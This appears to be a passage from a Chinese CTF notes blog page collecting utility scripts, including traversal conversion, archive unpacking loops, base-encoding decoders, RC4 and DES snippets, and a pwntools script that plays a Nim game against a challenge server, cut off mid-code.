<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_after_deep</span>(<span class="hljs-params">pre, mid, a</span>):<span class="hljs-comment">#已知前中，求后，a就是后序</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(pre) == <span class="hljs-number">1</span>:<br>        a.append(pre[<span class="hljs-number">0</span>])<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(pre) == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span><br>    root = pre[<span class="hljs-number">0</span>]<br>    root_index = mid.index(root)<br>    get_after_deep(pre[<span class="hljs-number">1</span>:root_index+<span class="hljs-number">1</span>], mid[:root_index], a)<br>    get_after_deep(pre[root_index+<span class="hljs-number">1</span>:], mid[root_index+<span class="hljs-number">1</span>:], a)<br>    a.append(root)<br>    <span class="hljs-keyword">return</span> a<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_hou</span>():<br>    pre=<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请依次输入前序遍历、中序遍历的结果，以换行分割:\n&quot;</span>)<br>    mid=<span class="hljs-built_in">input</span>()<br>    pre_list=<span class="hljs-built_in">list</span>(pre)<br>    mid_list=<span class="hljs-built_in">list</span>(mid)<br>    a=[]<br>    res_list=get_after_deep(pre,mid,a)<br>    res=<span class="hljs-string">&quot;&quot;</span>.join(res_list)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;后序遍历为:&quot;</span>,res)<br>get_hou()<br></code></pre></td></tr></table></figure>

<p>例题:<a target="_blank" rel="noopener" href="https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Reverse/%5BWUSTCTF2020%5Dlevel4.md">[WUSTCTF2020]level4</a></p>
<h2 id="python时间戳相关-获取文件访问-创建-修改时间"><a href="#python时间戳相关-获取文件访问-创建-修改时间" class="headerlink" title="python时间戳相关+获取文件访问&#x2F;创建&#x2F;修改时间"></a>python时间戳相关+获取文件访问&#x2F;创建&#x2F;修改时间</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/shaosks/p/5614630.html">来源</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime<br><span class="hljs-string">&#x27;&#x27;&#x27;把时间戳转化为时间: 1479264792 to 2016-11-16 10:53:12&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">TimeStampToTime</span>(<span class="hljs-params">timestamp</span>):<br>	timeStruct = time.localtime(timestamp)<br>	<span class="hljs-keyword">return</span> time.strftime(<span class="hljs-string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>,timeStruct)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">time_to_time_stamp</span>(<span class="hljs-params">str_time</span>):<br>    dt = datetime.strptime(str_time, <span class="hljs-string">&#x27;%Y-%m-%d %H:%M&#x27;</span>)<br>    <span class="hljs-keyword">return</span> dt.timestamp()<br><span class="hljs-string">&#x27;&#x27;&#x27;获取文件的大小,结果保留两位小数，单位为MB&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_FileSize</span>(<span class="hljs-params">filePath</span>):<br>	fsize = os.path.getsize(filePath)<br>	fsize = fsize/<span class="hljs-built_in">float</span>(<span class="hljs-number">1024</span>*<span class="hljs-number">1024</span>)<br>	<span class="hljs-keyword">return</span> <span class="hljs-built_in">round</span>(fsize,<span class="hljs-number">2</span>)<br><span class="hljs-string">&#x27;&#x27;&#x27;获取文件的访问时间&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_FileAccessTime</span>(<span class="hljs-params">filePath</span>):<br>	t = os.path.getatime(filePath)<br>	<span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;时间戳:<span class="hljs-subst">&#123;t&#125;</span>\n时间:<span class="hljs-subst">&#123;TimeStampToTime(t)&#125;</span>&quot;</span>)<br><span class="hljs-string">&#x27;&#x27;&#x27;获取文件的创建时间&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_FileCreateTime</span>(<span class="hljs-params">filePath</span>):<br>	t = os.path.getctime(filePath)<br>	<span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;时间戳:<span class="hljs-subst">&#123;t&#125;</span>\n时间:<span class="hljs-subst">&#123;TimeStampToTime(t)&#125;</span>&quot;</span>)<br><span class="hljs-string">&#x27;&#x27;&#x27;获取文件的修改时间&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_FileModifyTime</span>(<span class="hljs-params">filePath</span>):<br>	t = os.path.getmtime(filePath)<br>	<span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;时间戳:<span class="hljs-subst">&#123;t&#125;</span>\n时间:<span class="hljs-subst">&#123;TimeStampToTime(t)&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure>

<h2 id="嵌套zip文件解压"><a href="#嵌套zip文件解压" class="headerlink" title="嵌套zip文件解压"></a>嵌套zip文件解压</h2><h3 id="根据名称"><a href="#根据名称" class="headerlink" title="根据名称"></a>根据名称</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/109585465">来源</a>和<a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3/library/zipfile.html">zipfile参考</a>。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zipfile<br>name = <span class="hljs-string">&#x27;0573&#x27;</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    fz = zipfile.ZipFile(name + <span class="hljs-string">&#x27;.zip&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>)<br>    fz.extractall(pwd=<span class="hljs-built_in">bytes</span>(name, <span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    name = fz.filelist[<span class="hljs-number">0</span>].filename[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>]<br>    fz.close()<br></code></pre></td></tr></table></figure>

<h3 id="根据后缀并解压至当前目录"><a href="#根据后缀并解压至当前目录" class="headerlink" title="根据后缀并解压至当前目录"></a>根据后缀并解压至当前目录</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment"># https://unix.stackexchange.com/questions/4367/extracting-nested-zip-files</span><br><span class="hljs-comment"># https://askubuntu.com/questions/146634/shell-script-to-move-all-files-from-subfolders-to-parent-folder</span><br><span class="hljs-keyword">while</span> [ <span class="hljs-string">&quot;`find . -type f -name &#x27;*.zip&#x27; | wc -l`&quot;</span> &gt; 0 ]<br><span class="hljs-keyword">do</span><br>    unzip *.zip<br>    <span class="hljs-built_in">rm</span> *.zip<br>    find . -mindepth 2 -<span class="hljs-built_in">type</span> f -<span class="hljs-built_in">print</span> -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">mv</span> &#123;&#125; . \;<br>    <span class="hljs-built_in">rmdir</span> */<br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://github.com/D-SEK-CTF/tcp1p-2023-writeup/tree/main/misc/zipzipzip">https://github.com/D-SEK-CTF/tcp1p-2023-writeup/tree/main/misc/zipzipzip</a></p>
<h2 id="python根据RGB数据生成图片"><a href="#python根据RGB数据生成图片" class="headerlink" title="python根据RGB数据生成图片"></a>python根据RGB数据生成图片</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/109585465">来源</a>及<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43790276/article/details/108478270">PIL参考</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>x = y = <span class="hljs-number">200</span><br>img = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>,(x,y))<br>file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./qr.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br><br><span class="hljs-keyword">for</span> width <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,x):<br>    <span class="hljs-keyword">for</span> height <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,y):<br>        line = file.readline()<br>        rgb = line.split(<span class="hljs-string">&#x27;,&#x27;</span>)<br>        img.putpixel((width,height),(<span class="hljs-built_in">int</span>(rgb[<span class="hljs-number">0</span>]),<span class="hljs-built_in">int</span>(rgb[<span class="hljs-number">1</span>]),<span class="hljs-built_in">int</span>(rgb[<span class="hljs-number">2</span>])))<br>img.save(<span class="hljs-string">&#x27;flag.jpg&#x27;</span>)<br></code></pre></td></tr></table></figure>

<h2 id="多重base64-16-32-85混合套娃解密脚本"><a href="#多重base64-16-32-85混合套娃解密脚本" class="headerlink" title="多重base64|16|32|85混合套娃解密脚本"></a>多重base64|16|32|85混合套娃解密脚本</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/109829704">来源</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">baseDec</span>(<span class="hljs-params">text,<span class="hljs-built_in">type</span></span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span> == <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> base64.b16decode(text)<br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">type</span> == <span class="hljs-number">2</span>:<br>        <span class="hljs-keyword">return</span> base64.b32decode(text)<br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">type</span> == <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">return</span> base64.b64decode(text)<br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">type</span> == <span class="hljs-number">4</span>:<br>        <span class="hljs-keyword">return</span> base64.b85decode(text)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">detect</span>(<span class="hljs-params">text</span>):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> re.<span class="hljs-keyword">match</span>(<span class="hljs-string">&quot;^[0-9A-F=]+$&quot;</span>,text.decode()) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>    <br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> re.<span class="hljs-keyword">match</span>(<span class="hljs-string">&quot;^[A-Z2-7=]+$&quot;</span>,text.decode()) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">2</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> re.<span class="hljs-keyword">match</span>(<span class="hljs-string">&quot;^[A-Za-z0-9+/=]+$&quot;</span>,text.decode()) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">3</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">4</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">autoDec</span>(<span class="hljs-params">text</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;MRCTF&#123;&quot;</span> <span class="hljs-keyword">in</span> text:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n&quot;</span>+text.decode())<br>            <span class="hljs-keyword">break</span><br><br>        code = detect(text)<br>        text = baseDec(text,code)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    flag = f.read()<br><br>autoDec(flag)<br></code></pre></td></tr></table></figure>

<h2 id="汇编指令与机器码对照表"><a href="#汇编指令与机器码对照表" class="headerlink" title="汇编指令与机器码对照表"></a>汇编指令与机器码对照表</h2><p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/7835b5526854">链接</a></p>
<h2 id="python运算符优先级"><a href="#python运算符优先级" class="headerlink" title="python运算符优先级"></a>python运算符优先级</h2><p><a target="_blank" rel="noopener" href="http://c.biancheng.net/view/2190.html">链接</a></p>
<h2 id="python以大端和小端处理数据"><a href="#python以大端和小端处理数据" class="headerlink" title="python以大端和小端处理数据"></a>python以大端和小端处理数据</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/MikeCoke/article/details/113796480">题目及来源</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> struct<br><br>s = [<span class="hljs-number">72143238992041641000000.000000</span>,<span class="hljs-number">77135357178006504000000000000000.000000</span>,<span class="hljs-number">1125868345616435400000000.000000</span>,<span class="hljs-number">67378029765916820000000.000000</span>,<span class="hljs-number">75553486092184703000000000000.000000</span>,<span class="hljs-number">4397611913739958700000.000000</span>,<span class="hljs-number">76209378028621039000000000000000.000000</span>]<br>a = <span class="hljs-string">&#x27;&#x27;</span><br>b = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:<br>    i = <span class="hljs-built_in">float</span>(i)<br>    a += struct.pack(<span class="hljs-string">&#x27;&lt;f&#x27;</span>,i).<span class="hljs-built_in">hex</span>()        <span class="hljs-comment">#小端</span><br><span class="hljs-built_in">print</span>(a)<br><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> s:<br>    i = <span class="hljs-built_in">float</span>(i)<br>    b += struct.pack(<span class="hljs-string">&#x27;&gt;f&#x27;</span>,i).<span class="hljs-built_in">hex</span>()        <span class="hljs-comment">#大端</span><br><span class="hljs-built_in">print</span>(b)<br><br>a = <span class="hljs-number">0x496e74657265737472696e67204964656120746f20656e6372797074</span><br>b = <span class="hljs-number">0x74707972747079727470797274707972747079727470797274707972</span><br><span class="hljs-built_in">print</span>(long_to_bytes(a))<br><span class="hljs-built_in">print</span>(long_to_bytes(b))<br></code></pre></td></tr></table></figure>

<h2 id="RC4加密脚本"><a href="#RC4加密脚本" class="headerlink" title="RC4加密脚本"></a>RC4加密脚本</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/105661450">题目及来源</a>。RC4加密和解密都是一个方法。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_main</span>(<span class="hljs-params">key = <span class="hljs-string">&quot;init_key&quot;</span>, message = <span class="hljs-string">&quot;init_message&quot;</span></span>): <span class="hljs-comment">#返回加密后的内容</span><br>    s_box = rc4_init_sbox(key)<br>    crypt = <span class="hljs-built_in">str</span>(rc4_excrypt(message, s_box))<br>    <span class="hljs-keyword">return</span>  crypt<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_init_sbox</span>(<span class="hljs-params">key</span>):<br>    s_box = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>)) <br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + s_box[i] + <span class="hljs-built_in">ord</span>(key[i % <span class="hljs-built_in">len</span>(key)])) % <span class="hljs-number">256</span><br>        s_box[i], s_box[j] = s_box[j], s_box[i]<br>    <span class="hljs-keyword">return</span> s_box<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_excrypt</span>(<span class="hljs-params">plain, box</span>):<br>    res = []<br>    i = j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> plain:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + box[i]) % <span class="hljs-number">256</span><br>        box[i], box[j] = box[j], box[i]<br>        t = (box[i] + box[j]) % <span class="hljs-number">256</span><br>        k = box[t]<br>        res.append(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(s) ^ k))<br>    cipher = <span class="hljs-string">&quot;&quot;</span>.join(res)<br>    <span class="hljs-keyword">return</span> (<span class="hljs-built_in">str</span>(base64.b64encode(cipher.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)), <span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><br>key = <span class="hljs-string">&quot;HereIsTreasure&quot;</span>  <span class="hljs-comment">#此处为密钥</span><br>message = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入明文:\n&quot;</span>)<br>enc_base64 = rc4_main( key , message )<br>enc_init = <span class="hljs-built_in">str</span>(base64.b64decode(enc_base64),<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>enc_url = parse.quote(enc_init)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;rc4加密后的url编码:&quot;</span>+enc_url)<br><span class="hljs-comment">#print(&quot;rc4加密后的base64编码&quot;+enc_base64)</span><br></code></pre></td></tr></table></figure>

<h2 id="SSH连接远程服务器"><a href="#SSH连接远程服务器" class="headerlink" title="SSH连接远程服务器"></a>SSH连接远程服务器</h2><p>假设用户名是root，服务器为node4.buuoj.cn，端口25298，则这样连接：</p>
<ul>
<li>ssh -p 25298 <a href="mailto:&#x72;&#x6f;&#111;&#116;&#x40;&#110;&#x6f;&#100;&#x65;&#52;&#46;&#x62;&#117;&#117;&#x6f;&#x6a;&#46;&#x63;&#110;">&#x72;&#x6f;&#111;&#116;&#x40;&#110;&#x6f;&#100;&#x65;&#52;&#46;&#x62;&#117;&#117;&#x6f;&#x6a;&#46;&#x63;&#110;</a></li>
</ul>
<p>更多ssh参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/li528405176/article/details/82810342">此处</a>。</p>
<h2 id="python-Crypto解密des密文"><a href="#python-Crypto解密des密文" class="headerlink" title="python Crypto解密des密文"></a>python Crypto解密des密文</h2><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/181019#h3-15">题目及来源</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> DES<br>key = <span class="hljs-string">b&quot;t\x00e\x00s\x00t\x00&quot;</span><br>des = DES.new(key, mode = DES.MODE_CBC, iv = key)<br>a = <span class="hljs-string">b&quot;xZWDZaKEhWNMCbiGYPBIlY3+arozO9zonwrYLiVL4njSez2RYM2WwsGnsnjCDnHs7N43aFvNE54noSadP9F8eEpvTs5QPG+KL0TDE/40nbU=&quot;</span><br>a = base64.b64decode(a)<br>res = des.decrypt(a)[<span class="hljs-number">0</span>:-<span class="hljs-number">6</span>].decode(<span class="hljs-string">&quot;utf-16&quot;</span>)<br><span class="hljs-built_in">print</span>(res)<br></code></pre></td></tr></table></figure>

<h2 id="常见算法特征总结"><a href="#常见算法特征总结" class="headerlink" title="常见算法特征总结"></a>常见算法特征总结</h2><p><a target="_blank" rel="noopener" href="https://b0ldfrev.gitbook.io/note/miscellaneous/suan-fa-te-zheng-zong-jie">链接</a></p>
<h2 id="GCC编译C文件为可执行文件"><a href="#GCC编译C文件为可执行文件" class="headerlink" title="GCC编译C文件为可执行文件"></a>GCC编译C文件为可执行文件</h2><ul>
<li>gcc source.c -o result.o</li>
</ul>
<h2 id="套娃压缩文件解压bash脚本"><a href="#套娃压缩文件解压bash脚本" class="headerlink" title="套娃压缩文件解压bash脚本"></a>套娃压缩文件解压bash脚本</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/110051084">例题及来源</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">while</span> [ <span class="hljs-string">&quot;`find . -type f -name &#x27;*.tar.xz&#x27; | wc -l`&quot;</span> -gt 0 ]; <span class="hljs-keyword">do</span> find -<span class="hljs-built_in">type</span> f -name <span class="hljs-string">&quot;*.tar.xz&quot;</span> -<span class="hljs-built_in">exec</span> tar xf <span class="hljs-string">&#x27;&#123;&#125;&#x27;</span> \; -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">rm</span> -- <span class="hljs-string">&#x27;&#123;&#125;&#x27;</span> \;; <span class="hljs-keyword">done</span>;<br></code></pre></td></tr></table></figure>

<h2 id="Nim博弈pwntools交互"><a href="#Nim博弈pwntools交互" class="headerlink" title="Nim博弈pwntools交互"></a>Nim博弈pwntools交互</h2><p><a target="_blank" rel="noopener" href="https://xia0ji233.pro/2023/01/01/Nepnep-CatCTF2022/#catnim">来源</a>。有关nim博弈可以参考<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/422562139">此处</a>。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_pile</span>():<br>    p.recvuntil(<span class="hljs-string">&#x27;Now pile: &#x27;</span>)<br>    line=p.recvline()[:-<span class="hljs-number">1</span>].decode()<br>    <span class="hljs-keyword">return</span> line.split(<span class="hljs-string">&#x27; &#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_xor</span>(<span class="hljs-params">piles</span>):<br>    v=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> piles:<br>        v^=num<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;xor :&quot;</span>,v)<br>    <span class="hljs-keyword">return</span> v<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">choose</span>(<span class="hljs-params">piles</span>):<br>    v=get_xor(piles)<br>    i=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> piles:<br>        <span class="hljs-keyword">if</span> num-(num^v) &gt; <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">return</span> i,num-(num^v)<br>        i+=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>,<span class="hljs-literal">None</span><br>p=remote(<span class="hljs-string">&#x27;223.112.5.156&#x27;</span>,<span class="hljs-number">55068</span>)<br>p.sendline(<span class="hljs-string">&#x27;N&#x27;</span>)<br>start=time.time()<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    piles=get_pile()<br>    pilesnum=[<span class="hljs-built_in">int</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> piles]<br>    where,cnt=choose(pilesnum)<br>    <span class="hljs-built_in">print</span>(pilesnum)<br>    s=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> pilesnum:<br>        <span class="hljs-keyword">if</span> num==<span class="hljs-number">0</span>:<br>            s+=<span class="hljs-number">1</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;where:&#x27;</span>,<span class="hljs-built_in">str</span>(where))<br>    p.sendlineafter(<span class="hljs-string">&#x27;count:&#x27;</span>,<span 